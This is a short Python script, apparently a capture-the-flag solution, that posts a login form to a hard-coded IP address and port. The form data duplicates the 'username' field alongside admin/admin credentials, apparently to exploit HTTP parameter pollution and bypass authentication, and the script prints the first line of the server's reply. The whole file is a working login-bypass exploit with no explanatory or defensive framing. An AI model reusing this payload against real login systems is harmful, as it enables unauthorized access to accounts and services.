import requests

print(
	requests.post(
	"http://20.115.83.90:1338/",
	headers={
	"content-type": "application/x-www-form-urlencoded"
	},
	data="login-submit=a&username=admin&password=admin&username=b"
	).text.split("\n")[0]
)
